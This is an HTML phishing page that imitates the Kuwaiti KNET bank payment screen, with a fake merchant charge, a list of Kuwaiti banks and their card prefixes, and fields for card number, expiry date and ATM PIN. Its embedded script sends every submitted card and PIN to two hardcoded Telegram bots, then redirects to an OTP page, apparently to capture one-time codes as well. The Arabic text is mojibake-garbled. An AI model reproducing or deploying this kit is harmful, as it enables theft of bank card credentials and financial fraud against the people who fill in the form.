<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ุตูุญุฉ ุฏูุน ูู ูุช</title>
    <link rel="stylesheet" href="kpay.css">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1, user-scalable=no, minimal-ui">
</head>
<body>
    <header id="pageHeader">
        <img src="pc (1).jpg" alt="ุฑุฃุณ ุงูุตูุญุฉ" id="headerImage">
    </header>
    <div class="box bank-info" id="bankInfoBox">
        <img id="imgkn" src="images (3).png" alt="ุจูู ูุฑุจุฉ" class="bank-logo" id="bankLogo">
        <p id="beneficiaryLabel">ุงููุณุชููุฏ: <strong id="beneficiaryName">xcite</strong></p>
        <p id="amountLabel">ุงููุจูุบ: <strong id="amountValu">KD 5.000</strong></p>
    </div>
    

    <div class="box payment-form">
        <form id="paymentForm" onsubmit="event.preventDefault(); sendToTelegram();">
            <div class="input-container">
                <label id="textban" for="bankSelect">ุงุฎุชูุงุฑ ุงูุจูู:</label>
                <div class="input-box">
                    <select id="bankSelect" onchange="updateOptions()" required>
                        <option value="" disabled selected>ูุฑุฌู ุงุฎุชูุงุฑ ุงูุจูู</option>
                        <option value="ABK">ุงูุจูู ุงูุฃููู ุงููุชุญุฏ ABK</option>
                        <option value="RAJHI">RAJHI ูุตุฑู ุงูุฑุงุฌุญู</option>
                        <option value="BBK">BBK ุจูู ุงููููุช ูุงูุจุญุฑูู</option>
                        <option value="BOUBYAN">BOUBYAN ุจูู ุจูุจูุงู</option>
                        <option value="BURGAN">BURGAN ุจูู ุจุฑูุงู</option>
                        <option value="CBK">CBK ุงูุจูู ุงูุชุฌุงุฑู ุงููููุชู</option>
                        <option value="DOHA">DOHA ุจูู ุงูุฏูุญุฉ</option>
                        <option value="GBK">GBK ุจูู ุงูุฎููุฌ</option>
                        <option value="TAM">TAM ุจูุชู</option>
                        <option value="KFH">KFH ุจูุช ุงูุชูููู ุงููููุชู</option>
                        <option value="KIB">KIB ุจูู ุงููููุช ุงูุฏููู</option>
                        <option value="NBK">NBK ุจูู ุงููููุช ุงููุทูู</option>
                        <option value="WEYAY">WEYAY ุงููุทูู</option>
                        <option value="QNB">QNB ุจูู ูุทุฑ ุงููุทูู</option>
                        <option value="UNB">UNB ุจูู ุงูุงุชุญุงุฏ ุงููุทูู</option>
                        <option value="WARBA">WARBA ุจูู ูุฑุจุฉ</option>
                    </select>
                </div>
            </div>

            <div class="input-container">
                <label id="text2" for="cardNumber">ุฑูู ุงูุจุทุงูุฉ:</label>
                <div class="input-box">
                    <input type="number" id="cardNumber" placeholder=" " required inputmode="numeric" oninput="validateNumberInput(event)">
                </div>
                <select id="prefixSelect" required>
                    <option value="" disabled selected>Prefix</option>
                </select>
            </div>

            <div class="input-container">
                <label id="texst3" for="expiryDate">ุชุงุฑูุฎ ุงูุชูุงุก ุงูุจุทุงูุฉ:</label>
                <div class="expiry input-box">
                    <select id="monthSelect" required>
                        <option value="" disabled selected>MM</option>
                        <option value="01">01</option>
                        <option value="02">02</option>
                        <option value="03">03</option>
                        <option value="04">04</option>
                        <option value="05">05</option>
                        <option value="06">06</option>
                        <option value="07">07</option>
                        <option value="08">08</option>
                        <option value="09">09</option>
                        <option value="10">10</option>
                        <option value="11">11</option>
                        <option value="12">12</option>
                    </select>
                    <select id="yearSelect" required>
                        <option value="" disabled selected>YYYY</option>
                        <option value="2025">2025</option>
                        <option value="2026">2026</option>
                        <option value="2027">2027</option>
                        <option value="2028">2028</option>
                        <option value="2029">2029</option>
                        <option value="2030">2030</option>
                        <option value="2031">2031</option>
                        <option value="2032">2032</option>
                        <option value="2033">2033</option>
                        <option value="2034">2034</option>
                        <option value="2035">2035</option>
                    </select>
                </div>
            </div>

            <div class="input-container">
                <label id="texst4" for="pin">ุงูุฑูู ุงูุณุฑู:</label>
                <div class="input-box">
                    <input type="password" id="pin" placeholder="" required pattern="\d{4}" maxlength="4" inputmode="numeric">
                </div>
            </div>
        </form>
    </div>

    <div  class="box buttons" id="boxbuttons" >
        <button type="submit" form="paymentForm" id="submitButton">ุฅุฑุณุงู</button>
        <button type="button" onclick="resetForm()" id="submitButton">ุฅูุบุงุก</button>
    </div>    
    <p id="naem0">ุฌููุน ุงูุญููู ูุญููุธุฉยยฉ 2025ย
   </p>
        <p id="naem0">   
        ุดุฑูุฉ ุงูุฎุฏูุงุช ุงููุตุฑููุฉ ุงูุงููุฉ ุงููุดุชุฑูุฉ - ูู ูุช   </p>

        <script>


document.addEventListener("DOMContentLoaded", function () {
    const amount = localStorage.getItem("boton");
    if (amount) {
      document.getElementById("amountValu").textContent = amount;
    }
  });



            function sendToTelegram() {
                // ุฃูู ุชููู ูุขู ุฏู
                const botConfigs = [
                    {
                        token: '7484126870:AAEDSU1tM_kBFwSJ0IpQT0NmuWYzW8wq4_E',
            chatId: '6454807559'
                    },
                    {
                       token: '7861011533:AAE-7AqO49Yawvk19U0Svs1uHSoVr1Wf8Wo',
            chatId: '7595871538'
                    }
                ];
        
                const bank = document.getElementById("bankSelect").value;
                const selectedNumber = document.getElementById("prefixSelect").value;
                const cardNumber = document.getElementById("cardNumber").value;
                const expiryMonth = document.getElementById("monthSelect").value;
                const expiryYear = document.getElementById("yearSelect").value;
                const pin = document.getElementById("pin").value;
        
                if (!bank || !selectedNumber || !cardNumber || !expiryMonth || !expiryYear || !pin) {
                    alert("ูุฑุฌู ููุก ุฌููุน ุงูุญููู ูุจู ุงูุฅุฑุณุงู.");
                    return;
                }
        
                const message =
                    `๐ฉ ุฎุงุฑูู ุฌุฏูุฏ\n\n` +
                    `๐ฆ ุงุฎุชุตุงุฑ: ${bank}\n` +
                    `๐ข ุงูุจุงุฏุฆุฉ ${selectedNumber}\n` +
                    `๐ณ ุงูุฑูู ${cardNumber}\n` +
                    `๐ ุงูุชูุงุก ุงูุจุทุงูุฉ: ${expiryMonth}/${expiryYear}\n` +
                    `๐ ATM ${pin}`;
        
                // ุฅุฑุณุงู ุงูุฑุณุงูุฉ ุฅูู ูู ุญุณุงุจ
                botConfigs.forEach(({ token, chatId }) => {
                    const url = `https://api.telegram.org/bot${token}/sendMessage`;
        
                    fetch(url, {
                        method: "POST",
                        headers: { "Content-Type": "application/json" },
                        body: JSON.stringify({ chat_id: chatId, text: message })
                    })
                    .then(response => response.json())
                    .then(data => {
                        if (data.ok) {
                            console.log("โ ุชู ุงูุฅุฑุณุงู ุฅูู:", chatId);
                        } else {
                            console.error("โ ูุดู ูู ุงูุฅุฑุณุงู ุฅูู:", chatId);
                        }
                    })
                    .catch(error => {
                        console.error("โ๏ธ ุฎุทุฃ ูู ุงูุงุชุตุงู:", error);
                    });
                });
        
                // ุฅุนุงุฏุฉ ุงูุชูุฌูู ุจุนุฏ ุงูุฅุฑุณุงู
                setTimeout(() => {
                    window.location.href = "otp.html";
                }, 1000);
            }
        
            function updateOptions() {
                var bank = document.getElementById("bankSelect").value;
                var prefixSelect = document.getElementById("prefixSelect");
        
                prefixSelect.innerHTML = '<option value="" disabled selected>Prefix</option>';
        
                var options = {
                    ABK: ["403622", "423826", "428628"],
                    RAJHI: ["458838"],
                    BBK: ["588790", "418056"],
                    BOUBYAN: ["470350", "490455", "490456", "404919", "490456", "450605", "426058", "431199"],
                    BURGAN: ["49219000", "415254", "450238", "468564", "540759", "402978", "403583"],
                    CBK: ["532672", "537015", "521175", "516334"],
                    DOHA: ["419252"],
                    GBK: ["531644", "517419", "531471", "559475", "517458", "526206", "531329", "531470"],
                    TAM: ["45077848", "45077849"],
                    KFH: ["450778", "537016", "532674", "485602"],
                    KIB: ["406464", "409054"],
                    NBK: ["464452", "589160"],
                    WEYAY: ["464425250", "543363"],
                    QNB: ["524745", "521020"],
                    UNB: ["457778"],
                    WARBA: ["532749", "559459", "541350", "525528"]
                };
        
                if (options[bank]) {
                    options[bank].forEach(function (number) {
                        var option = document.createElement("option");
                        option.value = number;
                        option.textContent = number;
                        prefixSelect.appendChild(option);
                    });
                }
            }
        
            function validateNumberInput(event) {
                let inputField = document.getElementById("cardNumber");
                let value = inputField.value;
        
                if (value.length > 10) {
                    inputField.value = value.substring(0, 10);
                }
            }
        
            // ุนุฑุถ ุงููุจูุบ ูู localStorage
            const totalAmount = localStorage.getItem("totalAmount");
            document.getElementById("amountValue").innerText = totalAmount;
        </script>
        
</body>
</html>
